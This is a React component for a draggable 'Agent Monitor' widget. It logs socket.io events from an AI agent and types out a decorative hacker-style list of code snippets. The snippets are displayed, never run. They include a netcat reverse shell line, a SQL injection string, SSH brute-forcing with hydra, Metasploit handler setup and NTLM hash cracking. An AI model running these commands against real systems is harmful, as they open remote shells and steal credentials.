import React, { useEffect, useState, useRef, useCallback } from 'react';
import { io } from 'socket.io-client';
import { Terminal, Activity, Cpu, Shield, RotateCcw, Code, Zap } from 'lucide-react';

// Code snippets pour l'effet Matrix/Hacker
const CODE_SNIPPETS = [
    { lang: 'bash', code: 'nmap -sS -sV -O 192.168.1.0/24 --script vuln' },
    { lang: 'python', code: 'import socket; s = socket.socket(socket.AF_INET, SOCK_STREAM)' },
    { lang: 'sql', code: "SELECT * FROM users WHERE id=1 OR '1'='1'--" },
    { lang: 'bash', code: 'gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt' },
    { lang: 'bash', code: 'hydra -l admin -P rockyou.txt ssh://10.0.0.1' },
    { lang: 'python', code: 'hashlib.sha256(password.encode()).hexdigest()' },
    { lang: 'bash', code: 'sqlmap -u "http://target?id=1" --dbs --batch' },
    { lang: 'js', code: 'fetch("/api/data").then(r => r.json())' },
    { lang: 'bash', code: 'responder -I eth0 -wrf' },
    { lang: 'python', code: 'requests.get(url, verify=False, proxies={"http": "127.0.0.1:8080"})' },
    { lang: 'bash', code: 'theHarvester -d target.com -b google,linkedin' },
    { lang: 'bash', code: 'aircrack-ng -w wordlist.txt capture-01.cap' },
    { lang: 'bash', code: 'msfconsole -x "use exploit/multi/handler; set LHOST 0.0.0.0"' },
    { lang: 'python', code: 'subprocess.run(["nc", "-e", "/bin/sh", IP, PORT])' },
    { lang: 'bash', code: 'bloodhound-python -d domain.local -u user -p pass -c All' },
    { lang: 'bash', code: 'crackmapexec smb 10.0.0.0/24 -u user -p pass --shares' },
    { lang: 'bash', code: 'enum4linux -a 10.0.0.1' },
    { lang: 'bash', code: 'nikto -h http://target -Tuning x' },
    { lang: 'js', code: 'document.cookie = "session=" + btoa(payload)' },
    { lang: 'bash', code: 'hashcat -m 1000 ntlm.txt rockyou.txt -r rules/best64.rule' },
];

const SYSTEM_MESSAGES = [
    "Scanning neural pathways...",
    "Analyzing attack vectors...",
    "Loading exploit modules...",
    "Syncing with Ollama...",
    "Monitoring network traffic...",
    "Parsing response headers...",
    "Checking vulnerability database...",
    "Updating threat signatures...",
    "Establishing secure tunnel...",
    "Processing OSINT data...",
    "Training agent models...",
    "Decrypting communications...",
    "Mapping attack surface...",
    "Correlating threat intel...",
];

const AgentMonitor = () => {
    const [logs, setLogs] = useState([]);
    const [status, setStatus] = useState("Idle");
    const [activeTool, setActiveTool] = useState(null);
    const [currentSnippet, setCurrentSnippet] = useState(CODE_SNIPPETS[0]);
    const [typedCode, setTypedCode] = useState('');
    const logsEndRef = useRef(null);
    const socketRef = useRef(null);
    const typingRef = useRef(null);

    const addLog = useCallback((type, message) => {
        setLogs(prev => [...prev.slice(-50), { type, message, timestamp: new Date() }]);
    }, []);

    const handleReset = (e) => {
        e.stopPropagation();
        setLogs([]);
        setStatus("Idle");
        setActiveTool(null);
        addLog('SYSTEM', 'Monitor reset.');
    };

    // Effet de typing code en continu
    useEffect(() => {
        let charIndex = 0;
        const snippet = currentSnippet.code;
        
        const typeChar = () => {
            if (charIndex < snippet.length) {
                setTypedCode(snippet.substring(0, charIndex + 1));
                charIndex++;
                typingRef.current = setTimeout(typeChar, 30 + Math.random() * 50);
            } else {
                // Snippet terminé, passer au suivant après pause
                setTimeout(() => {
                    const nextIndex = Math.floor(Math.random() * CODE_SNIPPETS.length);
                    setCurrentSnippet(CODE_SNIPPETS[nextIndex]);
                    setTypedCode('');
                }, 2000);
            }
        };

        typingRef.current = setTimeout(typeChar, 500);
        
        return () => {
            if (typingRef.current) clearTimeout(typingRef.current);
        };
    }, [currentSnippet]);

    // Messages système périodiques quand idle
    useEffect(() => {
        const interval = setInterval(() => {
            if (status === "Idle" && Math.random() > 0.5) {
                const msg = SYSTEM_MESSAGES[Math.floor(Math.random() * SYSTEM_MESSAGES.length)];
                addLog('SYSTEM', msg);
            }
        }, 5000);
        
        return () => clearInterval(interval);
    }, [status, addLog]);

    useEffect(() => {
        socketRef.current = io('http://localhost:3000');

        socketRef.current.on('connect', () => {
            addLog('SYSTEM', 'Connected to Neural Network');
        });

        socketRef.current.on('agent:start', (data) => {
            setStatus("Processing");
            addLog('AGENT', `Starting generation [${data.model}]`);
        });

        socketRef.current.on('agent:thought', (data) => {
            addLog('THOUGHT', data.thought);
        });

        socketRef.current.on('agent:tool', (data) => {
            setActiveTool(data.toolName);
            addLog('TOOL', `Executing: ${data.toolName}`);
            setTimeout(() => setActiveTool(null), 3000);
        });

        socketRef.current.on('agent:end', () => {
            setStatus("Idle");
            addLog('AGENT', 'Task completed');
        });

        socketRef.current.on('agent:status', (data) => {
            setStatus(data.status);
        });

        // Écouter les événements des experts
        socketRef.current.on('expert:query', (data) => {
            addLog('EXPERT', `${data.expert} analyzing: ${data.query?.substring(0, 40)}...`);
        });

        socketRef.current.on('expert:response', (data) => {
            addLog('EXPERT', `${data.expert} responded`);
        });

        return () => {
            if (socketRef.current) socketRef.current.disconnect();
        };
    }, [addLog]);

    useEffect(() => {
        logsEndRef.current?.scrollIntoView({ behavior: "smooth" });
    }, [logs]);

    // Dragging Logic
    const [position, setPosition] = useState({ x: window.innerWidth - 400, y: window.innerHeight - 350 });
    const [isDragging, setIsDragging] = useState(false);
    const dragOffset = useRef({ x: 0, y: 0 });

    const handleMouseDown = useCallback((e) => {
        setIsDragging(true);
        dragOffset.current = {
            x: e.clientX - position.x,
            y: e.clientY - position.y
        };
    }, [position]);

    const handleMouseMove = useCallback((e) => {
        if (isDragging) {
            setPosition({
                x: e.clientX - dragOffset.current.x,
                y: e.clientY - dragOffset.current.y
            });
        }
    }, [isDragging]);

    const handleMouseUp = useCallback(() => {
        setIsDragging(false);
    }, []);

    useEffect(() => {
        if (isDragging) {
            window.addEventListener('mousemove', handleMouseMove);
            window.addEventListener('mouseup', handleMouseUp);
        } else {
            window.removeEventListener('mousemove', handleMouseMove);
            window.removeEventListener('mouseup', handleMouseUp);
        }
        return () => {
            window.removeEventListener('mousemove', handleMouseMove);
            window.removeEventListener('mouseup', handleMouseUp);
        };
    }, [isDragging, handleMouseMove, handleMouseUp]);

    return (
        <div
            className="fixed w-96 bg-black/95 border border-cyan-500/50 rounded-lg shadow-2xl overflow-hidden backdrop-blur-md z-50 font-mono text-xs"
            style={{ left: position.x, top: position.y, cursor: isDragging ? 'grabbing' : 'auto' }}
        >
            {/* Header */}
            <div
                className="bg-gray-900/80 p-2 border-b border-cyan-900 flex justify-between items-center cursor-grab active:cursor-grabbing select-none"
                onMouseDown={handleMouseDown}
            >
                <div className="flex items-center gap-2 text-cyan-400 pointer-events-none">
                    <Activity size={14} className={status !== 'Idle' ? 'animate-pulse' : ''} />
                    <span className="font-bold tracking-wider">AGENT MONITOR</span>
                </div>
                <div className="flex items-center gap-2">
                    <button
                        onMouseDown={handleReset}
                        onClick={handleReset}
                        className="text-gray-500 hover:text-red-400 transition-colors"
                        title="Reset Monitor"
                    >
                        <RotateCcw size={12} />
                    </button>
                    <div className={`px-2 py-0.5 rounded text-[10px] font-bold ${status === 'Idle' ? 'bg-gray-800 text-gray-400' : 'bg-cyan-900 text-cyan-300 animate-pulse'}`}>
                        {status.toUpperCase()}
                    </div>
                </div>
            </div>

            {/* Live Code Display */}
            <div className="bg-gray-950 p-2 border-b border-cyan-900/30">
                <div className="flex items-center gap-2 mb-1">
                    <Code size={12} className="text-green-500" />
                    <span className="text-green-500 text-[10px]">{currentSnippet.lang.toUpperCase()}</span>
                    <Zap size={10} className="text-yellow-500 animate-pulse" />
                </div>
                <div className="text-green-400 font-mono text-[11px] min-h-[20px] overflow-hidden">
                    <span className="text-gray-500">$ </span>
                    {typedCode}
                    <span className="animate-pulse text-cyan-400">▌</span>
                </div>
            </div>

            {/* Active Tool Overlay */}
            {activeTool && (
                <div className="bg-cyan-900/20 p-2 border-b border-cyan-900/50 flex items-center gap-2 text-cyan-300 animate-in slide-in-from-top duration-300">
                    <Cpu size={14} className="animate-spin-slow" />
                    <span>Using: {activeTool}</span>
                </div>
            )}

            {/* Logs Area */}
            <div className="h-40 overflow-y-auto p-2 space-y-1 scrollbar-thin scrollbar-thumb-cyan-900" onMouseDown={(e) => e.stopPropagation()}>
                {logs.length === 0 ? (
                    <div className="text-gray-600 text-center py-4">
                        <Terminal size={20} className="mx-auto mb-2 opacity-50" />
                        <span>Waiting for activity...</span>
                    </div>
                ) : (
                    logs.map((log, i) => (
                        <div key={i} className="flex gap-2 text-gray-300">
                            <span className="text-gray-600 shrink-0">[{log.timestamp.toLocaleTimeString().split(' ')[0]}]</span>
                            <span className={`font-bold shrink-0 ${
                                log.type === 'SYSTEM' ? 'text-green-500' :
                                log.type === 'AGENT' ? 'text-blue-400' :
                                log.type === 'TOOL' ? 'text-yellow-400' :
                                log.type === 'EXPERT' ? 'text-purple-400' :
                                log.type === 'THOUGHT' ? 'text-cyan-400' :
                                'text-gray-400'
                            }`}>
                                {log.type}:
                            </span>
                            <span className="break-words text-gray-300">{log.message}</span>
                        </div>
                    ))
                )}
                <div ref={logsEndRef} />
            </div>

            {/* Footer */}
            <div className="bg-gray-900/80 p-1.5 text-[10px] text-gray-500 border-t border-gray-800 flex justify-between items-center select-none" onMouseDown={handleMouseDown}>
                <span className="flex items-center gap-1"><Shield size={10} className="text-green-500" /> SECURE</span>
                <span className="flex items-center gap-1 text-cyan-500">
                    <Terminal size={10} />
                    {logs.length} logs
                </span>
                <span className={`flex items-center gap-1 ${status !== 'Idle' ? 'text-green-400 animate-pulse' : ''}`}>
                    <Activity size={10} />
                    LIVE
                </span>
            </div>
        </div>
    );
};

export default AgentMonitor;

